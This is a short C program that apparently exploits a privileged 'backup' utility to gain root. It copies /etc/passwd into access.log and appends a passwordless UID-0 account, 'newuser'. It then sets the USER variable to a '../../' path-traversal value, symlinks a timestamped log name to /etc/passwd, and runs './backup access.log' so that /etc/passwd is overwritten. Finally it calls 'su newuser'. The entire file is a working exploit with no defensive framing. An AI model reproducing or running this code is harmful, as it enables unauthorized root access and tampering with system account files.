#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>

int main() {
    FILE *file = fopen("access.log", "w"); // Open access.log in write mode
    if (file == NULL) {
        fprintf(stderr, "Error: Unable to create access.log\n");
        return 1;
    }

    // Append contents of /etc/passwd to access.log
    FILE *passwd_file = fopen("/etc/passwd", "r");
    if (passwd_file == NULL) {
        fprintf(stderr, "Error: Unable to read /etc/passwd\n");
        fclose(file); // Close access.log file before returning
        return 1;
    }

    char line[1024];
    while (fgets(line, sizeof(line), passwd_file)) {
        fprintf(file, "%s", line);
    }

    // Write the content to access.log
    fprintf(file, "\nnewuser::0:0:New User:/root:/bin/bash");

    // Close the passwd file
    fclose(passwd_file);

    // Close the access.log file
    fclose(file);

    char *realuser = getenv("USER");
    if (realuser == NULL) {
        fprintf(stderr, "Error: Unable to get the current user\n");
        return 1;
    }

    char pwd[100]; // Adjust the size according to your needs
    char user_value[200]; // Adjust the size according to your needs

    // Obtain the current working directory
    if (getcwd(pwd, sizeof(pwd)) != NULL) {
        // Concatenate "../../" with pwd
        sprintf(user_value, "../../%s", pwd);
    } else {
        perror("getcwd() error");
        // Handle error if needed
    }

    // Setting the value of USER environment variable
    setenv("USER", user_value, 1);

    time_t current = time(NULL); // Get the current time

    char command_symlnk[100]; // Assuming the command won't exceed 100 characters
    sprintf(command_symlnk, "ln -s /etc/passwd accesslog-%ld ", current);

    if (system(command_symlnk) != 0) {
        fprintf(stderr, "Error: Failed to create symbolic link\n");
        return 1;
    }
    printf("Symbolic link created. \n");

    system("./backup access.log");

    system("su newuser");

    return 0;
}
